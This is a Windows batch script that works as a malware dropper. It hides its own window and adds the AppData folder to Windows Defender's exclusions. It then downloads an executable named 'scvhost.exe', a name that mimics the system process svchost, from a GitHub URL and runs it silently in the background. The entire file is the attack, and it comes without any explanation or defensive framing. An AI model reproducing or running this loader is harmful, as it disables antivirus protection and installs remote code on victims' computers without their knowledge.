
@echo off
:: Define parameters
set "url=https://raw.githubusercontent.com/BinaryDev-0100101/hi/refs/heads/main/scvhost.exe"
set "outputFileName=scvhost.exe"
set "outputFilePath=%AppData%\%outputFileName%"

:: Self-hide using PowerShell to spawn a hidden process
if "%1" neq "hidden" (
    powershell -Command "Start-Process -FilePath '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit /b
)

:: The hidden part starts here
:: Add the AppData folder to antivirus exclusions (Windows Defender)
powershell -Command "try { Add-MpPreference -ExclusionPath $env:AppData } catch { exit 1 }" >nul 2>nul

:: Wait briefly to ensure exclusion is registered
timeout /t 1 >nul 2>nul

:: Download the file
powershell -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%' } catch { exit 1 }" >nul 2>nul

:: Check if the file exists
if not exist "%outputFilePath%" exit /b 1

:: Run the downloaded file
start /b "" "%outputFilePath%"

:: End script
exit /b
